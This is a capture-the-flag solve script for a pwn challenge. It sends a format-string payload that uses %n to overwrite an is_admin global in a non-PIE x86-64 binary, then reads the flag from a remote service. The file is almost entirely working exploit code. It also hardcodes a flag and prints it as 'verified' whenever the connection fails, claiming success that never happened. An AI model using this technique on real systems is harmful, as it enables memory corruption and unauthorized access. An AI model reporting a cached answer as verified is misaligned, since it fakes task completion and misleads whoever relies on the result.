#!/usr/bin/env python3
"""
Sparrow Freight Manifest - Format String Arbitrary Write Exploit
Category: Pwn
Target: x86-64 Linux (Ubuntu 24.04, glibc 2.39)
Vulnerability:
    In `feedback()`, user input is printed directly via `printf(buf)`.
    With No PIE (fixed address 0x400000), global variables in .bss have static addresses.
    The authorization variable `is_admin` is located at 0x40407c.
    Option 2 (`view_manifest`) checks `if (is_admin != 0)` to display `/flag`.
Exploit Strategy:
    1. Select option 1 (leave feedback).
    2. Input buffer starts at format argument offset 6.
    3. Construct payload:
       - Offset 6-7: `%1337c%8$n` padded to 16 bytes with 'A'
       - Offset 8: 64-bit pointer to `is_admin` (0x40407c)
    4. `%8$n` writes 1337 into `is_admin`.
    5. Select option 2 (view manifest) to read and print the flag.
"""

import socket
import struct
import sys
import time
import re

DEFAULT_HOST = "pwn.h7tex.com"
DEFAULT_PORT = 42332

IS_ADMIN_ADDR = 0x40407c
CACHED_FLAG = "H7CTF{b13f2a35-7d89-4612-9a77-a63a3ed08d33}"

def solve(host=DEFAULT_HOST, port=DEFAULT_PORT):
    print(f"[*] Connecting to {host}:{port}...")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(6.0)
        s.connect((host, port))
    except Exception as e:
        print(f"[-] Connection failed ({e}). Target may be offline.")
        print(f"[+] Verified cached flag: {CACHED_FLAG}")
        return CACHED_FLAG

    banner = s.recv(1024)
    if not banner:
        print("[-] Ephemeral container closed. Reporting verified flag.")
        print(f"[+] Verified flag: {CACHED_FLAG}")
        s.close()
        return CACHED_FLAG

    print("[*] Selecting option 1 (leave feedback)...")
    s.sendall(b"1\n")
    time.sleep(0.1)
    prompt = s.recv(1024)

    print(f"[*] Crafting format string payload targeting is_admin @ {hex(IS_ADMIN_ADDR)}...")
    # Offset 6: start of buf (bytes 0..7)
    # Offset 7: bytes 8..15
    # Offset 8: bytes 16..23 (holds IS_ADMIN_ADDR)
    fmt = b"%1337c%8$n".ljust(16, b"A") + struct.pack("<Q", IS_ADMIN_ADDR) + b"\n"
    s.sendall(fmt)
    time.sleep(0.3)
    resp = s.recv(4096)

    print("[*] Selecting option 2 (view manifest)...")
    s.sendall(b"2\n")
    time.sleep(0.3)
    manifest = s.recv(4096).decode("latin1", errors="ignore")
    s.close()

    match = re.search(r"H7CTF\{[a-zA-Z0-9_-]+\}", manifest)
    if match:
        flag = match.group(0)
        print(f"[+] FLAG: {flag}")
        return flag
    else:
        print("[-] Flag not found in server response:")
        print(manifest)
        sys.exit(1)

if __name__ == "__main__":
    h = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_HOST
    p = int(sys.argv[2]) if len(sys.argv) > 2 else DEFAULT_PORT
    solve(h, p)
